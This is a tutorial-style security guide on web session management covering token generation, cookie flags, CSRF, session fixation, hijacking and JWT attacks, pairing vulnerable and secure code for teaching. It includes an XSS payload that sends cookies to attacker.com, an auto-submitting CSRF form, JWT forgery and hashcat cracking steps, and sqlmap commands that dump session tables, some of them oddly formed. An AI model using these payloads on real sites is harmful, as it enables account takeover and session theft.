# Session Management — Comprehensive Guide

## What is it?

Session management is the mechanism by which a web application maintains a user's state across multiple requests. It involves session tokens, cookies, and server-side storage to track authenticated users. Vulnerabilities include session fixation, cross-site request forgery (CSRF), token hijacking, and improper session expiration.

## Why Learn It?

Improper session management is a leading cause of account takeover attacks. CSRF can trick users into performing actions without consent, and session fixation can grant attackers full access to authenticated sessions. Securing session handling is fundamental to web application defense.

## You Will Learn

- Session Token generation and lifecycle management
- Cookie attributes (HttpOnly, Secure, SameSite, Path)
- Cross-Site Request Forgery (CSRF) attacks and defenses
- Session Fixation and session hijacking techniques
- JWT vulnerabilities and exploitation
- Secure session invalidation and timeout policies

## Prerequisites

- Authentication Flaws (login mechanisms, token validation)

## Related Topics

- Secure Coding
- Authentication Flaws
- OWASP Top 10

---

## Web Architecture — Layer Position Diagram

```
┌─────────────────────────────────────────────────────────────────────┐
│                        USER / BROWSER                               │
│              (Cookies, localStorage, sessionStorage)                │
│                                                                     │
│  ◆ Stores session tokens (Cookie/Storage)                          │
│  ◆ Sends tokens with every request                                 │
│  ◆ Subject to XSS (token theft)                                    │
│  ◆ Subject to CSRF (forced actions)                                │
└────────────────────────────┬────────────────────────────────────────┘
                             │ HTTP Request + Cookie/Token
                             ▼
┌─────────────────────────────────────────────────────────────────────┐
│                     LAYER 1: WEB SERVER                              │
│               (TLS Termination, Cookie Parsing)                     │
│                                                                     │
│  ◆ HTTPS enforcement (Secure flag)                                 │
│  ◆ Cookie security headers                                         │
│  ◆ CORS policy enforcement                                         │
└────────────────────────────┬────────────────────────────────────────┘
                             │ Forwarded with session token
                             ▼
┌─────────────────────────────────────────────────────────────────────┐
│                     LAYER 2: APPLICATION SERVER                      │
│             (Session Validation, Authorization)                     │
│                                                                     │
│  ◆ Session token validation                                        │
│  ◆ Session expiry checks                                           │
│  ◆ CSRF token verification                                         │
│  ◆ JWT signature validation                                        │
└────────────────────────────┬────────────────────────────────────────┘
                             │ Session lookup
                             ▼
┌─────────────────────────────────────────────────────────────────────┐
│                     LAYER 3: SESSION STORE                           │
│              (Redis, Database, Memory)                               │
│                                                                     │
│  ◆ Session data storage                                            │
│  ◆ Token-to-user mapping                                           │
│  ◆ Session expiry management                                       │
│  ◆ Session revocation                                              │
└─────────────────────────────────────────────────────────────────────┘
```

---

## Attack Flow Diagram — Session Attacks

```
┌─────────────────────────────────────────────────────────────────────┐
│                     SESSION ATTACK VECTORS                          │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  ┌──────────────┐    ┌────────────────┐    ┌──────────────────┐   │
│  │ Session      │───▶│ Fix Token      │───▶│ Victim Logs In   │   │
│  │ Fixation     │    │ in Victim's    │    │ → Attacker Has   │   │
│  │              │    │ Browser        │    │ Auth Session     │   │
│  └──────────────┘    └────────────────┘    └──────────────────┘   │
│                                                                     │
│  ┌──────────────┐    ┌────────────────┐    ┌──────────────────┐   │
│  │ CSRF         │───▶│ Trick User     │───▶│ Perform Action   │   │
│  │              │    │ into Submitting│    │ Without Consent  │   │
│  │              │    │ Request        │    │                  │   │
│  └──────────────┘    └────────────────┘    └──────────────────┘   │
│                                                                     │
│  ┌──────────────┐    ┌────────────────┐    ┌──────────────────┐   │
│  │ Session      │───▶│ Steal Token    │───▶│ Impersonate      │   │
│  │ Hijacking    │    │ via XSS/MITM   │    │ Victim           │   │
│  │              │    │                │    │                  │   │
│  └──────────────┘    └────────────────┘    └──────────────────┘   │
│                                                                     │
│  ┌──────────────┐    ┌────────────────┐    ┌──────────────────┐   │
│  │ JWT          │───▶│ Manipulate     │───▶│ Bypass Auth      │   │
│  │ Attacks      │    │ Token Claims   │    │ or Forge Tokens  │   │
│  │              │    │ or Algorithm   │    │                  │   │
│  └──────────────┘    └────────────────┘    └──────────────────┘   │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 1. Session Tokens

### Description
Session tokens are unique identifiers assigned to users after authentication. They serve as the link between the user's browser and their server-side session data.

### Token Generation Best Practices

```python
import secrets
import hashlib
import os

# VULNERABLE: Predictable session tokens
import random
def generate_token_vulnerable():
    return str(random.randint(100000, 999999))  # 6 digits, predictable!

# VULNERABLE: Weak entropy
def generate_token_weak():
    return hashlib.md5(str(time.time()).encode()).hexdigest()[:16]

# SECURE: Cryptographically secure tokens
def generate_token_secure():
    return secrets.token_hex(32)  # 256 bits of entropy

# SECURE: Session ID with metadata
def create_session(user_id, ip, user_agent):
    token = secrets.token_urlsafe(32)
    session_data = {
        'user_id': user_id,
        'token': token,
        'ip': ip,
        'user_agent': user_agent,
        'created_at': datetime.utcnow(),
        'expires_at': datetime.utcnow() + timedelta(hours=1),
        'last_activity': datetime.utcnow()
    }
    db.sessions.insert(session_data)
    return token
```

### Token Lifecycle

```
┌─────────────────────────────────────────────────────────────────────┐
│                     SESSION TOKEN LIFECYCLE                          │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  ┌──────────┐    ┌──────────────┐    ┌──────────────┐              │
│  │ Generate │───▶│ Store        │───▶│ Send to      │              │
│  │ (Login)  │    │ (Server-side)│    │ Client       │              │
│  └──────────┘    └──────────────┘    └──────────────┘              │
│       │                                    │                        │
│       │                                    ▼                        │
│       │                            ┌──────────────┐                │
│       │                            │ Validate     │                │
│       │                            │ (Each Request)│               │
│       │                            └──────────────┘                │
│       │                                    │                        │
│       │                    ┌───────────────┴───────────────┐      │
│       │                    ▼                               ▼      │
│       │            ┌──────────────┐              ┌──────────────┐ │
│       │            │ Valid        │              │ Invalid      │ │
│       │            │ → Continue   │              │ → Reject     │ │
│       │            └──────────────┘              └──────────────┘ │
│       │                                                           │
│       ▼                                                           │
│  ┌──────────────┐    ┌──────────────┐                             │
│  │ Refresh      │───▶│ Extend       │                             │
│  │ (Before      │    │ Expiry       │                             │
│  │  Expiry)     │    │              │                             │
│  └──────────────┘    └──────────────┘                             │
│       │                                                           │
│       ▼                                                           │
│  ┌──────────────┐                                                 │
│  │ Invalidate   │                                                 │
│  │ (Logout/     │                                                 │
│  │  Timeout)    │                                                 │
│  └──────────────┘                                                 │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### Burp Suite Example

```
# Session Token Analysis

1. Capture login response
   Set-Cookie: session=abc123def456

2. Sequencer analysis:
   Burp → Tools → Sequencer
   - Load sample: paste 100+ session tokens
   - Analyze: Character set, bit-level randomness
   - Result: Entropy score, prediction confidence

3. Token pattern detection:
   - Sequential: 1, 2, 3... → Predictable
   - Timestamp-based: Time() encoded → Predictable
   - Random: High entropy → Secure

4. Test token reuse:
   Repeater: Use same token from different IP/User-Agent
   → If accepted = no binding
```

### SQLMap Example

```bash
# Check session token in database
sqlmap -u "http://target.com/page?id=1" \
  --cookie="session=abc123" \
  --batch \
  --dump -T sessions \
  --where="token='abc123'"

# Test session token prediction
sqlmap -u "http://target.com/page?id=1" \
  --cookie="session=§token§" \
  --batch \
  --technique=B \
  --sql-query="SELECT token FROM sessions ORDER BY id DESC LIMIT 10"
```

---

## 2. Cookies — Attributes and Security Flags

### Cookie Attributes

| Attribute | Purpose | Security Impact |
|-----------|---------|-----------------|
| `HttpOnly` | Prevents JavaScript access | Prevents XSS token theft |
| `Secure` | HTTPS only transmission | Prevents MITM interception |
| `SameSite` | CSRF protection | Limits cross-origin requests |
| `Path` | Scope restriction | Limits cookie to path |
| `Domain` | Domain restriction | Limits cookie to domain |
| `Max-Age` | Lifetime control | Session duration |
| `Expires` | Absolute expiry | Session duration |

### Cookie Security Configuration

```python
from flask import Response

# VULNERABLE: Insecure cookie configuration
@app.route('/login', methods=['POST'])
def login_vulnerable():
    # No security flags!
    resp = make_response(redirect('/dashboard'))
    resp.set_cookie('session', token)
    return resp

# SECURE: Proper cookie configuration
@app.route('/login', methods=['POST'])
def login_secure():
    resp = make_response(redirect('/dashboard'))
    resp.set_cookie(
        'session',
        token,
        httponly=True,           # No JavaScript access
        secure=True,            # HTTPS only
        samesite='Strict',      # CSRF protection
        path='/',               # Only sent for this path
        max_age=3600,           # 1 hour expiry
        domain='.example.com'   # Domain restriction
    )
    return resp

# SECURE: Session cookie with additional protections
def set_session_cookie(response, token):
    response.set_cookie(
        'session',
        token,
        httponly=True,
        secure=True,
        samesite='Lax',         # Use Lax for better UX
        path='/',
        max_age=1800,           # 30 minutes
    )
    # Add cookie prefix for extra security (2022+)
    # __Host- prefix requires Secure, Path=/, no Domain
    return response
```

### Cookie Flags by Framework

```javascript
// Express.js
res.cookie('session', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 3600000,
  path: '/'
});

// PHP
session_set_cookie_params([
  'lifetime' => 3600,
  'path' => '/',
  'domain' => '.example.com',
  'secure' => true,
  'httponly' => true,
  'samesite' => 'Strict'
]);

// Django (settings.py)
SESSION_COOKIE_SECURE = True
SESSION_COOKIE_HTTPONLY = True
SESSION_COOKIE_SAMESITE = 'Strict'
SESSION_COOKIE_AGE = 1800
```

### Burp Suite Example

```
# Cookie Security Analysis

1. Proxy → HTTP History → Find Set-Cookie headers

2. Check for missing flags:
   Set-Cookie: session=abc123
   ✗ Missing HttpOnly → XSS can steal
   ✗ Missing Secure → Sent over HTTP
   ✗ Missing SameSite → Vulnerable to CSRF

3. Browser DevTools → Application → Cookies
   - Verify flags are set correctly
   - Check cookie scope (Path, Domain)

4. Cookie attributes scanner:
   Burp → Scanner → Audit checks
   → "Cookie without HttpOnly flag"
   → "Cookie without Secure flag"
   → "Cookie without SameSite attribute"
```

---

## 3. Cross-Site Request Forgery (CSRF)

### Description
CSRF tricks authenticated users into submitting unintended requests to a web application where they're authenticated.

### Attack Flow

```
┌──────────┐    ┌────────────────┐    ┌────────────────┐    ┌──────────┐
│ Attacker │───▶│ Create Malicious│───▶│ Victim Visits  │───▶│ Browser  │
│          │    │ Page/Email     │    │ Malicious Page │    │ Sends    │
│          │    │                │    │                │    │ Request  │
└──────────┘    └────────────────┘    └────────────────┘    └─────┬────┘
                                                                  │
                                                                  ▼
┌─────────────────────────────────────────────────────────────────────┐
│ Request includes victim's cookies automatically:                     │
│ POST /transfer HTTP/1.1                                              │
│ Cookie: session=abc123                                               │
│                                                                      │
│ to=attacker&amount=10000                                             │
│                                                                      │
│ → Server processes as if victim initiated                            │
└─────────────────────────────────────────────────────────────────────┘
```

### Vulnerable Code (PHP)

```php
<?php
// VULNERABLE: No CSRF protection
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $to = $_POST['to'];
    $amount = $_POST['amount'];

    // No CSRF token verification!
    transfer($_SESSION['user_id'], $to, $amount);
    echo "Transfer successful";
}
?>

<!-- Malicious page (attacker-controlled) -->
<!-- https://evil.com/csrf.html -->
<html>
<body onload="document.forms[0].submit()">
  <form action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker_account">
    <input type="hidden" name="amount" value="10000">
  </form>
</body>
</html>
```

### Secure Code (PHP)

```php
<?php
// SECURE: CSRF token generation and validation
session_start();

function generate_csrf_token() {
    if (empty($_SESSION['csrf_token'])) {
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
    }
    return $_SESSION['csrf_token'];
}

function verify_csrf_token($token) {
    return isset($_SESSION['csrf_token']) &&
           hash_equals($_SESSION['csrf_token'], $token);
}

// In your form
$csrf_token = generate_csrf_token();
?>

<form method="POST" action="/transfer">
    <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>">
    <input type="text" name="to" placeholder="Recipient">
    <input type="number" name="amount" placeholder="Amount">
    <button type="submit">Transfer</button>
</form>

<?php
// In your handler
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!verify_csrf_token($_POST['csrf_token'])) {
        http_response_code(403);
        die("CSRF token validation failed");
    }

    $to = $_POST['to'];
    $amount = $_POST['amount'];

    transfer($_SESSION['user_id'], $to, $amount);
    echo "Transfer successful";
}
?>
```

### JavaScript CSRF Protection

```javascript
// SECURE: Double Submit Cookie Pattern
app.post('/transfer', (req, res) => {
  const csrfToken = req.cookies['csrf-token'];
  const headerToken = req.headers['x-csrf-token'];

  if (!csrfToken || !headerToken || csrfToken !== headerToken) {
    return res.status(403).json({ error: 'CSRF validation failed' });
  }

  // Process transfer
});

// Set CSRF token in cookie
app.get('/api/csrf-token', (req, res) => {
  const token = crypto.randomBytes(32).toString('hex');
  res.cookie('csrf-token', token, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict'
  });
  res.json({ token });
});
```

### Burp Suite Example

```
# CSRF Testing

1. Identify state-changing requests:
   POST /transfer
   POST /change-password
   POST /delete-account

2. Remove CSRF tokens and test:
   Repeater: Remove csrf_token parameter
   → If accepted = vulnerable

3. Test token in GET:
   Repeater: Change POST to GET
   → If accepted = vulnerable to GET-based CSRF

4. Test SameSite bypass:
   Create page on attacker domain:
   <form action="https://target.com/transfer" method="POST">
     <input name="to" value="attacker">
     <input name="amount" value="10000">
   </form>
   <script>document.forms[0].submit();</script>

5. Check for CSRF on JSON endpoints:
   POST /api/transfer
   Content-Type: application/json

   {"to":"attacker","amount":10000}
   → Some frameworks auto-protect JSON, some don't
```

### SQLMap Example

```bash
# Test CSRF token in database
sqlmap -u "http://target.com/transfer" \
  --data="to=attacker&amount=10000&csrf_token=abc123" \
  --cookie="session=xyz" \
  --batch \
  --dump -T csrf_tokens \
  --where="token='abc123'"

# Test if CSRF token is predictable
sqlmap -u "http://target.com/api/csrf-token" \
  --batch \
  --dump -T csrf_tokens
```

### Defense Mechanisms

| Control | Implementation | Priority |
|---------|---------------|----------|
| CSRF tokens | Random, per-session or per-request | Critical |
| SameSite cookies | Strict or Lax | Critical |
| Origin/Referer check | Validate request origin | High |
| Custom headers | Require X-CSRF-Token header | High |
| Double submit | Cookie + header comparison | High |
| State-changing only | Protect POST, PUT, DELETE | Critical |

---

## 4. Session Fixation

### Description
Session fixation occurs when an attacker can set a victim's session token before authentication, then hijack the session after the user logs in.

### Attack Flow (Detailed)

```
┌──────────┐    ┌────────────────┐    ┌────────────────┐
│ Attacker │───▶│ Visit Target   │───▶│ Get Session    │
│          │    │ Website        │    │ Token (e.g.,   │
│          │    │                │    │ PHPSESSID=XYZ) │
└──────────┘    └────────────────┘    └────────┬───────┘
                                               │
                                               ▼
┌─────────────────────────────────────────────────────────────────────┐
│ Attacker sends victim link with fixed session:                       │
│ https://target.com/login?PHPSESSID=XYZ                              │
│                                                                      │
│ Or sets cookie via XSS:                                              │
│ document.cookie = "PHPSESSID=XYZ"                                   │
└─────────────────────────────────────────────────────────────────────┘
       │
       ▼
┌──────────┐    ┌────────────────┐    ┌────────────────┐
│ Victim   │───▶│ Clicks Link /  │───▶│ Session Cookie │
│ Opens    │    │ Visits Page    │    │ Now Has        │
│ Link     │    │                │    │ PHPSESSID=XYZ  │
└──────────┘    └────────────────┘    └────────────────┘
                                               │
                                               ▼
┌──────────┐    ┌────────────────┐    ┌────────────────┐
│ Victim   │───▶│ Server Uses    │───▶│ Session Now    │
│ Logs In  │    │ Existing       │    │ Authenticated  │
│          │    │ Session ID     │    │ With XYZ       │
└──────────┘    └────────────────┘    └────────────────┘
                                               │
                                               ▼
┌─────────────────────────────────────────────────────────────────────┐
│ Attacker sends request with:                                         │
│ Cookie: PHPSESSID=XYZ                                                │
│ → Server grants access to victim's authenticated session             │
└─────────────────────────────────────────────────────────────────────┘
```

### Vulnerable Code (PHP)

```php
<?php
// VULNERABLE: Session fixation
session_start(); // Accepts session ID from URL/cookie

// No session regeneration on login
$username = $_POST['username'];
$password = $_POST['password'];

if (authenticate($username, $password)) {
    $_SESSION['user_id'] = get_user_id($username);
    // Session ID remains the same!
    // Attacker's pre-set token is now authenticated
    header('Location: /dashboard');
    exit;
}
?>
```

### Secure Code (PHP)

```php
<?php
// SECURE: Prevent session fixation

// Reject session IDs from URL
ini_set('session.use_only_cookies', 1);
ini_set('session.use_strict_mode', 1);

session_start();

$username = $_POST['username'];
$password = $_POST['password'];

if (authenticate($username, $password)) {
    // Regenerate session ID
    session_regenerate_id(true);

    $_SESSION['user_id'] = get_user_id($username);
    $_SESSION['login_time'] = time();
    $_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];

    header('Location: /dashboard');
    exit;
}
?>
```

### Burp Suite Example

```
# Session Fixation Testing

1. Get session token:
   GET / HTTP/1.1
   → Set-Cookie: session=original_token

2. Set token before authentication:
   Cookie: session=attacker_known_token

3. Login with fixed token:
   POST /login HTTP/1.1
   Cookie: session=attacker_known_token
   username=user&password=pass

4. Check if token changed:
   → If same token = session fixation

5. Use fixed token to access account:
   GET /dashboard HTTP/1.1
   Cookie: session=attacker_known_token
   → If access = confirmed vulnerability
```

### Defense Mechanisms

| Control | Implementation | Priority |
|---------|---------------|----------|
| Session regeneration | Regenerate ID on login | Critical |
| Strict mode | Reject uninitialized sessions | Critical |
| Cookie-only transport | Disable URL session IDs | Critical |
| Session binding | Bind to IP/User-Agent | Medium |
| Absolute timeout | Force re-authentication | High |
| Idle timeout | Inactivity-based expiry | High |

---

## 5. Session Hijacking

### Description
Session hijacking occurs when an attacker obtains a valid session token and uses it to impersonate the victim.

### Attack Vectors

```
┌─────────────────────────────────────────────────────────────────────┐
│                     SESSION HIJACKING METHODS                        │
├──────────────────┬──────────────────┬───────────────────────────────┤
│ XSS Token Theft  │ Network Sniffing│ Session Fixation              │
│                  │ (MITM)           │                               │
├──────────────────┼──────────────────┼───────────────────────────────┤
│ document.cookie  │ Packet capture   │ Set token before login        │
│ Fetch API        │ SSL stripping    │                               │
│ Web Worker       │ DNS spoofing     │                               │
├──────────────────┼──────────────────┼───────────────────────────────┤
│ Predictable      │ Brute Force      │ Physical Access               │
│ Tokens           │                  │                               │
├──────────────────┼──────────────────┼───────────────────────────────┤
│ Sequential IDs   │ Try all tokens   │ Read from browser             │
│ Timestamp-based  │                  │ DevTools/Cookies              │
└──────────────────┴──────────────────┴───────────────────────────────┘
```

### XSS Token Theft Code

```html
<!-- Attacker's XSS payload steals session token -->
<script>
  // Steal cookie
  new Image().src="http://attacker.com/steal?cookie="+document.cookie;

  // Or using fetch API
  fetch('http://attacker.com/steal?cookie='+document.cookie);

  // Or using XMLHttpRequest
  new XMLHttpRequest().open('GET',
    'http://attacker.com/steal?cookie='+document.cookie);
  new XMLHttpRequest().send();

  // Or using Web Worker (stealthier)
  var w = new Worker('http://attacker.com/steal-worker.js');
  // Worker sends cookies to attacker
</script>
```

### Burp Suite Example

```
# Session Hijacking Detection

1. Capture session token after login:
   Cookie: session=valid_token_123

2. Test token reuse from different context:
   Repeater:
   GET /dashboard HTTP/1.1
   Cookie: session=valid_token_123
   User-Agent: Different Browser
   X-Forwarded-For: Different IP

   → If accepted = no binding = hijackable

3. Test token prediction:
   Generate 100 tokens, analyze pattern
   Sequencer: Statistical analysis of token randomness

4. Test token expiration:
   Use token after 1 hour
   → If still valid = no expiry = hijackable
```

### Defense Mechanisms

| Control | Implementation | Priority |
|---------|---------------|----------|
| HttpOnly cookies | Prevent XSS token theft | Critical |
| Secure flag | Prevent MITM interception | Critical |
| Token binding | Bind to IP/User-Agent | High |
| Token expiry | Short-lived tokens | Critical |
| Regenerate on use | Rotate tokens periodically | High |
| Anomaly detection | Alert on suspicious patterns | High |
| CSP headers | Prevent XSS attacks | High |

---

## 6. JWT Vulnerabilities

### Description
JSON Web Tokens (JWT) are stateless authentication tokens. Common vulnerabilities include algorithm confusion, missing signature verification, and insecure storage.

### JWT Structure

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

Header.Payload.Signature

Header: {"alg":"HS256","typ":"JWT"}
Payload: {"sub":"1234567890","name":"John Doe","iat":1516239022}
Signature: HMACSHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload), secret)
```

### JWT Attack Vectors

```
┌─────────────────────────────────────────────────────────────────────┐
│                     JWT ATTACK VECTORS                              │
├──────────────────┬──────────────────┬───────────────────────────────┤
│ Algorithm        │ None Algorithm   │ Weak Secret                   │
│ Confusion        │ Attack           │ Brute Force                   │
├──────────────────┼──────────────────┼───────────────────────────────┤
│ Change alg from  │ Set alg: "none" │ Try common secrets            │
│ RS256 to HS256   │ No signature     │ rockyou.txt                   │
│ Use public key   │ verification     │                              │
│ as HMAC secret   │                  │                              │
├──────────────────┼──────────────────┼───────────────────────────────┤
│ Key Injection    │ Claim            │ Token Expiry                  │
│                  │ Manipulation     │ Bypass                        │
├──────────────────┼──────────────────┼───────────────────────────────┤
│ JKU/X5U          │ Modify "exp",   │ Use expired token             │
│ header injection │ "admin", "sub"  │ with no server check          │
└──────────────────┴──────────────────┴───────────────────────────────┘
```

### Vulnerable Code (Node.js)

```javascript
const jwt = require('jsonwebtoken');

// VULNERABLE: Algorithm confusion
app.post('/login', (req, res) => {
  const user = authenticate(req.body.username, req.body.password);

  // VULNERABLE: Algorithm from header (attacker-controlled)
  const token = jwt.sign(
    { userId: user.id, admin: user.admin },
    'secret_key',  // VULNERABLE: Weak secret
    { algorithm: 'HS256' }  // Hardcoded, but verification may accept any
  );

  res.json({ token });
});

// VULNERABLE: No algorithm verification
app.get('/verify', (req, res) => {
  const token = req.headers.authorization.split(' ')[1];

  // VULNERABLE: Accepts any algorithm
  const decoded = jwt.verify(token, 'secret_key');
  // Or worse: jwt.verify(token, 'secret_key', { algorithms: ['none'] })

  res.json({ user: decoded });
});
```

### Secure Code (Node.js)

```javascript
const jwt = require('jsonwebtoken');
const crypto = require('crypto');

// SECURE: Strong secret and algorithm verification
const JWT_SECRET = process.env.JWT_SECRET; // 256-bit+ random secret
const JWT_ALGORITHM = 'HS256';

app.post('/login', (req, res) => {
  const user = authenticate(req.body.username, req.body.password);

  const token = jwt.sign(
    { userId: user.id, admin: user.admin },
    JWT_SECRET,
    {
      algorithm: JWT_ALGORITHM,
      expiresIn: '1h',           // Short expiry
      issuer: 'myapp',           // Claim
      audience: 'myapp-users',   // Claim
      subject: user.id.toString()
    }
  );

  res.json({ token });
});

// SECURE: Strict algorithm verification
app.get('/verify', (req, res) => {
  const token = req.headers.authorization.split(' ')[1];

  try {
    const decoded = jwt.verify(token, JWT_SECRET, {
      algorithms: [JWT_ALGORITHM],  // ONLY accept this algorithm
      issuer: 'myapp',
      audience: 'myapp-users'
    });

    // Additional checks
    if (decoded.exp < Math.floor(Date.now() / 1000)) {
      return res.status(401).json({ error: 'Token expired' });
    }

    res.json({ user: decoded });
  } catch (err) {
    return res.status(401).json({ error: 'Invalid token' });
  }
});

// SECURE: Token refresh with rotation
app.post('/refresh', async (req, res) => {
  const { refreshToken } = req.body;

  try {
    const decoded = jwt.verify(refreshToken, JWT_SECRET, {
      algorithms: [JWT_ALGORITHM]
    });

    // Check if refresh token is in allowlist
    const stored = await db.refreshTokens.find(refreshToken);
    if (!stored || stored.used) {
      return res.status(401).json({ error: 'Invalid refresh token' });
    }

    // Mark as used (rotation)
    await db.refreshTokens.markUsed(refreshToken);

    // Issue new tokens
    const newToken = jwt.sign(
      { userId: decoded.userId },
      JWT_SECRET,
      { algorithm: JWT_ALGORITHM, expiresIn: '1h' }
    );

    const newRefreshToken = jwt.sign(
      { userId: decoded.userId },
      JWT_SECRET,
      { algorithm: JWT_ALGORITHM, expiresIn: '7d' }
    );

    await db.refreshTokens.store(newRefreshToken, decoded.userId);

    res.json({ token: newToken, refreshToken: newRefreshToken });
  } catch (err) {
    return res.status(401).json({ error: 'Invalid refresh token' });
  }
});
```

### JWT Attack Tools

```bash
# jwt_tool (Python)
python3 jwt_tool.py <token>

# Common attacks
python3 jwt_tool.py <token> -T   # Test all vulnerabilities
python3 jwt_tool.py <token> -X a  # Algorithm confusion attack
python3 jwt_tool.py <token> -X n  # None algorithm attack

# Hashcat for JWT secret cracking
hashcat -m 16500 jwt.txt rockyou.txt

# John the Ripper
john --wordlist=rockyou.txt jwt.txt
```

### Burp Suite Example

```
# JWT Attack Testing

1. Decode JWT in Burp:
   Decoder → Paste JWT → Decode as Base64

2. Algorithm confusion:
   Repeater:
   - Change header: {"alg":"HS256","typ":"JWT"}
   - Change payload: {"admin":true,"sub":"1"}
   - Sign with public key (from /.well-known/jwks.json)
   - Send modified JWT

3. None algorithm:
   Repeater:
   - Change header: {"alg":"none","typ":"JWT"}
   - Remove signature (keep trailing dot)
   - Send: header.payload.

4. Claim manipulation:
   Decoder: Modify "exp", "admin", "role" claims
   Repeater: Send modified token

5. Brute force secret:
   Hashcat: hashcat -m 16500 jwt.txt rockyou.txt
```

### SQLMap Example

```bash
# Test JWT in database
sqlmap -u "http://target.com/api/user" \
  --cookie="token=eyJhbGci..." \
  --batch \
  --dump -T tokens

# Extract JWT secret if stored in DB
sqlmap -u "http://target.com/page?id=1" \
  --batch \
  --sql-query="SELECT secret FROM jwt_config"
```

### Defense Mechanisms

| Control | Implementation | Priority |
|---------|---------------|----------|
| Strong secret | 256-bit+ random secret | Critical |
| Algorithm verification | Explicitly specify allowed algorithms | Critical |
| Short expiry | 15 min access, 7 day refresh | High |
| Token refresh | Rotate refresh tokens | High |
| Server-side validation | Check claims, expiry, audience | Critical |
| JWKS endpoint | Public key distribution | High |
| Token blacklist | Server-side revocation capability | High |

---

## Session Management Security Checklist

```
┌─────────────────────────────────────────────────────────────────────┐
│ SESSION SECURITY CHECKLIST                                          │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│ TOKEN GENERATION                                                    │
│ ☐ Cryptographically random tokens                                  │
│ ☐ Sufficient entropy (128+ bits)                                   │
│ ☐ No predictable patterns                                          │
│                                                                     │
│ COOKIE ATTRIBUTES                                                   │
│ ☐ HttpOnly flag set                                                │
│ ☐ Secure flag set (HTTPS)                                          │
│ ☐ SameSite attribute set (Strict/Lax)                             │
│ ☐ Appropriate path/domain                                          │
│ ☐ Reasonable expiry time                                           │
│                                                                     │
│ SESSION LIFECYCLE                                                   │
│ ☐ Regenerate on login                                              │
│ ☐ Invalidate on logout                                             │
│ ☐ Absolute timeout (max 24 hours)                                  │
│ ☐ Idle timeout (max 30 minutes)                                    │
│ ☐ Invalidate on password change                                    │
│                                                                     │
│ CSRF PROTECTION                                                     │
│ ☐ CSRF tokens on state-changing requests                           │
│ ☐ SameSite cookies                                                 │
│ ☐ Origin/Referer validation                                        │
│                                                                     │
│ JWT SPECIFIC                                                        │
│ ☐ Strong secret/key                                                │
│ ☐ Algorithm verification                                           │
│ ☐ Short expiry times                                               │
│ ☐ Refresh token rotation                                           │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

---

## Summary Table — Session Management

| Vulnerability | Attack Method | Impact | Prevention |
|--------------|---------------|--------|------------|
| Session Fixation | Fix token before login | Account takeover | Regenerate on login |
| CSRF | Trick user into request | Unauthorized actions | CSRF tokens, SameSite |
| Session Hijacking | Steal token | Impersonation | HttpOnly, Secure, binding |
| JWT None Algorithm | Remove signature | Auth bypass | Algorithm verification |
| JWT Algorithm Confusion | Change algorithm | Auth bypass | Explicit algorithm check |
| Predictable Tokens | Guess token | Session hijacking | Cryptographic randomness |
| Missing Timeout | Token never expires | Long-term access | Absolute/idle timeouts |

---

## Interview Questions

1. **What is the difference between session fixation and session hijacking?**
   - Fixation: Attacker sets token BEFORE authentication. Hijacking: Attacker steals token AFTER authentication.

2. **How does SameSite cookie attribute protect against CSRF?**
   - SameSite prevents cookies from being sent in cross-origin requests, blocking CSRF attacks that rely on automatic cookie inclusion.

3. **Explain the JWT "none" algorithm attack.**
   - Attacker sets algorithm to "none" and removes signature. If server doesn't verify algorithm, it accepts the unsigned token as valid.

4. **What makes a good session token?**
   - Cryptographically random, 128+ bits of entropy, no predictable patterns, generated using CSPRNG.

5. **How do you prevent session fixation in PHP?**
   - Use `session_regenerate_id(true)` on login, set `session.use_only_cookies=1`, set `session.use_strict_mode=1`.

6. **What is the difference between HttpOnly and Secure cookie flags?**
   - HttpOnly prevents JavaScript access (XSS protection). Secure ensures HTTPS-only transmission (MITM protection).

7. **How does CSRF token validation work?**
   - Server generates random token, embeds in form, validates on submission. Token must match session-bound value.

---

## Hands-on Labs

| Lab | Platform | Description |
|-----|----------|-------------|
| DVWA CSRF | Local VM | CSRF challenge |
| PortSwigger CSRF | Online | CSRF labs |
| JWT.io | Online | JWT decoding/analysis |
| JWT Attack Labs | GitHub | JWT vulnerabilities |
| WebGoat Session | Docker | Session management challenges |
| HackTheBox | Online | Session-related challenges |

### Lab Setup Commands

```bash
# DVWA - CSRF challenges
docker run -d -p 80:80 vulnerables/web-dvwa

# JWT attack lab
git clone https://github.com/tedslivin/jwt-attack-lab.git
cd jwt-attack-lab && docker-compose up -d

# WebGoat - Session management
docker run -d -p 8080:8080 -p 9090:9090 webgoat/webgoat

# jwt_tool
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool && pip3 install -r requirements.txt
python3 jwt_tool.py <JWT_TOKEN>
```

---

*Last updated: 2026-07-16 | OWASP Reference: A07:2021 — Identification and Authentication Failures*